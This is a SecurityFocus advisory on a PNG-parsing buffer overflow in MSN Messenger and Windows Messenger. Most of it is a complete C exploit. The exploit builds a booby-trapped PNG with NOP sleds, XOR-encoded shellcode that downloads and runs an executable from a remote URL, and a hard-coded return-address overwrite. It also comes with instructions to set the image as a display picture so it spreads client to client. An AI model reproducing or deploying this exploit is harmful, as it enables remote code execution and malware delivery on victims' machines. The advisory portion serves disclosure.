source: http://www.securityfocus.com/bid/12506/info

A remotely exploitable buffer overflow exists in MSN Messenger and Windows Messenger. This vulnerability is related to parsing of Portable Network Graphics (PNG) image header data. Successful exploitation will result in execution of arbitrary code in the context of the vulnerable client user.

Attack vectors and mitigations may differ for MSN Messenger and Windows Messenger. For Windows Messenger, the attacker must spoof the .NET Messenger service and the client must be configured to receive .NET alerts.

However, MSN Messenger may be exploited through various methods in a client-to-client attack. Possible attack vectors for this vulnerability in MSN Messenger include:
User display pictures
Custom icons that are displayed inline in instant messages
Thumbnails of transferred images
Background images

Since this issue may be exploited in a client-to-client attack for MSN Messenger, it is a likely candidate for development of a worm.

/*
*
* MSN Messenger PNG Image Buffer Overflow Download Shellcoded Exploit
* Bug discoveried by Core Security Technologies  (www.coresecurity.com)
* Exploit coded By ATmaCA
* Copyright ?2002-2005 AtmacaSoft Inc. All Rights Reserved.
* Web: http://www.atmacasoft.com
* E-Mail: atmaca@icqmail.com
* Credit to kozan and delikon
* Usage:exploit <OutputPath> <Url>
*
*/

/*
*
* Tested with MSN Messenger 6.2.0137
* This vulnerability can be exploited on Windows 2000 (all service packs)
* and Windows XP (all service packs) that run vulnerable
* clients of MSN Messenger.
*
*/

/*
*
* After creating vuln png image, open
* MSN Messenger and select it as your display picture in
* "Tools->Change Display Picture".
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>


#ifdef __BORLANDC__
        #include <mem.h>
#endif

#define NOP 0x90

char png_header[] =
"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52"
"\x00\x00\x00\x40\x00\x00\x00\x40\x08\x03\x00\x00\x00\x9D\xB7\x81"
"\xEC\x00\x00\x01\xB9\x74\x52\x4E\x53";

char pngeof[] = "\x90\x90\x90\x59\xE8\x47\xFE\xFF\xFF";

/* Generic win32 http download shellcode
   xored with 0x1d by delikon (http://delikon.de/) */
char shellcode[] = "\xEB"
"\x10\x58\x31\xC9\x66\x81\xE9\x22\xFF\x80\x30\x1D\x40\xE2\xFA\xEB\x05\xE8\xEB\xFF"
"\xFF\xFF\xF4\xD1\x1D\x1D\x1D\x42\xF5\x4B\x1D\x1D\x1D\x94\xDE\x4D\x75\x93\x53\x13"
"\xF1\xF5\x7D\x1D\x1D\x1D\x2C\xD4\x7B\xA4\x72\x73\x4C\x75\x68\x6F\x71\x70\x49\xE2"
"\xCD\x4D\x75\x2B\x07\x32\x6D\xF5\x5B\x1D\x1D\x1D\x2C\xD4\x4C\x4C\x90\x2A\x4B\x90"
"\x6A\x15\x4B\x4C\xE2\xCD\x4E\x75\x85\xE3\x97\x13\xF5\x30\x1D\x1D\x1D\x4C\x4A\xE2"
"\xCD\x2C\xD4\x54\xFF\xE3\x4E\x75\x63\xC5\xFF\x6E\xF5\x04\x1D\x1D\x1D\xE2\xCD\x48"
"\x4B\x79\xBC\x2D\x1D\x1D\x1D\x96\x5D\x11\x96\x6D\x01\xB0\x96\x75\x15\x94\xF5\x43"
"\x40\xDE\x4E\x48\x4B\x4A\x96\x71\x39\x05\x96\x58\x21\x96\x49\x18\x65\x1C\xF7\x96"
"\x57\x05\x96\x47\x3D\x1C\xF6\xFE\x28\x54\x96\x29\x96\x1C\xF3\x2C\xE2\xE1\x2C\xDD"
"\xB1\x25\xFD\x69\x1A\xDC\xD2\x10\x1C\xDA\xF6\xEF\x26\x61\x39\x09\x68\xFC\x96\x47"
"\x39\x1C\xF6\x7B\x96\x11\x56\x96\x47\x01\x1C\xF6\x96\x19\x96\x1C\xF5\xF4\x1F\x1D"
"\x1D\x1D\x2C\xDD\x94\xF7\x42\x43\x40\x46\xDE\xF5\x32\xE2\xE2\xE2\x70\x75\x75\x33"
"\x78\x65\x78\x1D";

FILE           *di;
int            i = 0;
short int      weblength;
char           *web;
char           *pointer = NULL;
char           *newshellcode;

/*xor cryptor*/
char *Sifrele(char *Name1)
{
        char *Name=Name1;
        char xor=0x1d;
        int Size=strlen(Name);
        for(i=0;i<Size;i++)
                Name[i]=Name[i]^xor;
        return Name;
}


void main(int argc, char *argv[])
{

        if (argc < 3)
        {
                printf("MSN Messenger PNG Image Buffer Overflow Download Shellcoded Exploit\n");
                printf("Bug discoveried by Core Security Technologies  (www.coresecurity.com)\n");
                printf("Exploit coded By ATmaCA\n");
                printf("Copyright ?2002-2005 AtmacaSoft Inc. All Rights Reserved.\n");
                printf("Web: http://www.atmacasoft.com\n");
                printf("E-Mail: atmaca@icqmail.com\n");
                printf("Credit to kozan and delikon\n\n");
                printf("\tUsage:exploit <OutputPath> <Url>\n");
                printf("\tExample:exploit vuln.png http://www.atmacasoft.com/exp/msg.exe\n");

                return;
        }


        web = argv[2];


        if( (di=fopen(argv[1],"wb")) == NULL )
        {
                printf("Error opening file!\n");
                return;
        }
        for(i=0;i<sizeof(png_header)-1;i++)
                fputc(png_header[i],di);

        /*stuff in a couple of NOPs*/
        for(i=0;i<99;i++)
                fputc(NOP,di);

        weblength=(short int)0xff22;
        pointer=strstr(shellcode,"\x22\xff");
        weblength-=strlen(web)+1;
        memcpy(pointer,&weblength,2);
        newshellcode = new char[sizeof(shellcode)+strlen(web)+1];
        strcpy(newshellcode,shellcode);
        strcat(newshellcode,Sifrele(web));
        strcat(newshellcode,"\x1d");

        //shell code
        for(i=0;i<strlen(newshellcode);i++)
                fputc(newshellcode[i],di);


        for(i=0;i<(83-strlen(web));i++) //NOPs
                fputc(NOP,di);

        /*Overwriting the return address (EIP)*/
        /*0x005E0547 - ret */
        fputc(0x47,di);
        fputc(0x05,di);
        fputc(0x5e,di);
        fputc(0x00,di);

        for(i=0;i<sizeof(pngeof)-1;i++)
                fputc(pngeof[i],di);

        printf("Vulnarable png file %s has been generated!\n",argv[1]);

        fclose(di);
}